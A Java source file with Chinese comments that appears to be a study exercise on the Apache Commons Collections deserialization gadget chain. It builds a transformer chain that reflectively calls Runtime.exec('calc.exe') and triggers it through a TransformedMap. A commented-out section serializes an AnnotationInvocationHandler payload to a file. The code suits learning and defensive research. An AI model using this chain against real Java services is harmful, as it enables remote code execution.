package fanxulie;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class fanxulie5 {

	public static void main(String[] args) throws Exception {
	    //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组
	    Transformer[] transformers = new Transformer[] {
	        new ConstantTransformer(Runtime.class),
	        new InvokerTransformer("getMethod", 
	            new Class[] {String.class, Class[].class }, new Object[] {
	            "getRuntime", new Class[0] }),
	        new InvokerTransformer("invoke", 
	            new Class[] {Object.class, Object[].class }, new Object[] {
	            null, new Object[0] }),
	        new InvokerTransformer("exec", 
	            new Class[] {String.class }, new Object[] {"calc.exe"})};

	    //首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap
	    Transformer transformedChain = new ChainedTransformer(transformers);
//	    transformedChain.transform('1');
	    Map innerMap = new HashMap();
	    innerMap.put("1", "zhang");

	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
	    //触发Map中的MapEntry产生修改（例如setValue()函数
	    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();	    
	    onlyElement.setValue("foobar");
	    /*代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：
	       首先通过ConstantTransformer获得Runtime类
	       进一步通过反射调用getMethod找到invoke函数
	       最后再运行命令calc.exe。
	    */
	    
////此处用序列化
//        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//
//        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
//        ctor.setAccessible(true);
//        Object instance = ctor.newInstance(Target.class, outerMap);
//
//        File f = new File("qqqqq.bin");
//        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
//        out.writeObject(instance);
//        
//	    
	}

}
